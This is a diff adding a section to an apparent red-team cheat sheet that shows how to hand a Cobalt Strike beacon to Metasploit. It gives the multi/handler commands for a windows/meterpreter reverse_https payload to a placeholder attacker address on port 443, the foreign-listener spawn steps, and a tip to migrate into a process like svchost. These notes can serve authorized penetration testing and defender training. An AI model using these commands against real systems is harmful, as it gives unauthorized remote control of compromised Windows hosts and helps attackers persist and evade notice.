@@ -19,6 +19,29 @@ set DisablePayloadHandler True
 exploit (-j)
 ```
 
+Move a Cobalt beacon to Metasploit
+
+\(Spawn Meterpreter from Beacon\)
+
+```
+in Metasploit
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST ATTACKINGIP
+set LPORT 443
+set ExitOnSession False
+exploit (-j)
+
+in Cobalt
+setup a foreign listener
+windows/foreign/reverse_https
+Right Click Beacon-->Spawn-->Select foreign beacon
+
+Note: Cobalt will spawn an x86 shell, for any post exploit modules make sure to migrate to an x64 process like svchost
+if applicable
+
+```
+
 View targets available from Initial Target
 
 ```
